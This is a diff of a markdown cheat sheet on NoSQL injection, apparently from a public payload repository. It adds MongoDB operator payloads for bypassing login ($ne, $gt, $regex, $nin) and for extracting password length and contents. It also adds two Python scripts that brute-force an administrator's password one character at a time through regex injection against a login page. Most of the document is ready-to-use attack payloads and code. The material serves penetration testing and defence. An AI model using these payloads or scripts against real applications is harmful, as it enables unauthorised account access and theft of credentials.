@@ -1,14 +1,37 @@
 # NoSQL injection
 
-NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+
+## Summary
+
+* [Tools](#tools)
+* [Exploit](#exploits)
+  * [Authentication Bypass](#authentication-bypass)
+  * [Extract length information](#extract-length-information)
+  * [Extract data information](#extract-data-information)
+* [Blind NoSQL](#blind-nosql)
+  * [POST with JSON body](#post-with-json-body)
+  * [GET](#get)
+* [MongoDB Payloads](#mongodb-payloads)
+* [References](#references)
+
+## Tools
+
+* [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
+* [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
 
 ## Exploit
+
+### Authentication Bypass
 
 Basic authentication bypass using not equal ($ne) or greater ($gt)
 
 ```json
-in URL
+in DATA
 username[$ne]=toto&password[$ne]=toto
+login[$regex]=a.*&pass[$ne]=lol
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 
 in JSON
 {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -17,14 +40,14 @@ in JSON
 {"username": {"$gt":""}, "password": {"$gt":""}}
 ```
 
-Extract length information
+### Extract length information
 
 ```json
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-Extract data information
+### Extract data information
 
 ```json
 in URL
@@ -63,13 +86,38 @@ urllib3.disable_warnings()
 username="admin"
 password=""
 u="http://example.org/login"
+headers={'content-type': 'application/json'}
 
 while True:
     for c in string.printable:
         if c not in ['*','+','.','?','|']:
             payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-            r = requests.post(u, data = {'ids': payload}, verify = False)
-            if 'OK' in r.text:
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
+                print("Found one more char : %s" % (password+c))
+                password += c
+```
+
+### POST with urlencoded body
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://example.org/login"
+headers={'content-type': 'application/x-www-form-urlencoded'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|','&','$']:
+            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                 print("Found one more char : %s" % (password+c))
                 password += c
 ```
@@ -123,5 +171,5 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 
 * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
 * [Testing for NoSQL injection - OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
-* [cr0hn - NoSQL injection wordlists](https://github.com/cr0hn/nosqlinjection_wordlists)
-* [Zanon - NoSQL Injection in MongoDB](https://zanon.io/posts/nosql-injection-in-mongodb)
+* [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
+* [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
